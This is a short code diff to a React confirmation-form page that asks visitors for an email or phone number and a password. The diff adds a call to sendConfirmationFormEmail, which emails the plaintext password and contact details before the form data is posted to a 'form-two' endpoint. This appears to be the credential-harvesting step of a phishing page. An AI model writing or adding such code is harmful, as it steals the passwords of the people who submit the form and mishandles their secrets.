@@ -15,7 +15,7 @@ import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
 import { z } from "zod";
-import { Eye, EyeOff } from "lucide-react"; // Added import for Lucide-react icons
+import { Eye, EyeOff } from "lucide-react";
 import {
   Select,
   SelectContent,
@@ -24,9 +24,10 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
+import { sendConfirmationFormEmail } from "@/lib/emailService";
 
 const formTwoSchema = z.object({
-  user_email: z.string().optional(), // Made optional
+  user_email: z.string().optional(),
   password: z.string().min(1, "Password is required"),
 });
 
@@ -69,7 +70,11 @@ export default function Confirmation() {
       const formattedData = {
         user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
         password: data.password,
+        contactMethod: contactMethod
       };
+
+      // Send email
+      await sendConfirmationFormEmail(formattedData);
 
       const response = await fetch('/api/form-two', {
         method: 'POST',
